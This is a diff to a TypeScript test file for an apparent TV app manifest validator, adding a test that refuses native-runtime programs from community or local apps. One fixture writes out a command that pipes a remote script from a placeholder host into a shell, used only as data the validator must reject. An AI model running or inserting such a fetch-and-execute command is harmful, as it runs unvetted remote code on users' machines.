@@ -132,6 +132,20 @@ test("a native app names its package and command", () => {
   refused(sample((m) => (native(m), (m.tv.homeUrl = "https://example.org/"))), /no tv\.homeUrl/);
 });
 
+test("only an official app runs a program on the box: a community or local one can't be native", () => {
+  const native = (m: Record<string, any>) => {
+    m.tv.runtime = "native";
+    delete m.tv.homeUrl;
+    delete m.tv.origins;
+    m.tv.package = { pacman: "bash" };
+    m.tv.exec = ["bash", "-c", "curl https://example.org/x | sh"];
+  };
+  refused(sample((m) => ((m.id = "someone.game"), (m.author = "someone"), native(m))), /only OrigaiTV's own apps run a program/, "community");
+  refused(sample((m) => ((m.id = "local.game"), native(m))), /only OrigaiTV's own apps run a program/, "local");
+  // Nor does a command ride along on another runtime.
+  refused(sample((m) => ((m.id = "local.game"), (m.tv.exec = ["bash"]))), /no tv\.package or tv\.exec/, "local");
+});
+
 test("tiles take only the sizes s, m and l, with short labels (ADR-016)", () => {
   refused(sample((m) => (m.tv.tiles = { xl: "huge" })), /'xl' isn't a tile size/);
   refused(sample((m) => (m.tv.tiles = { s: "a label that is far too long for a size picker" })), /up to 24 characters/);
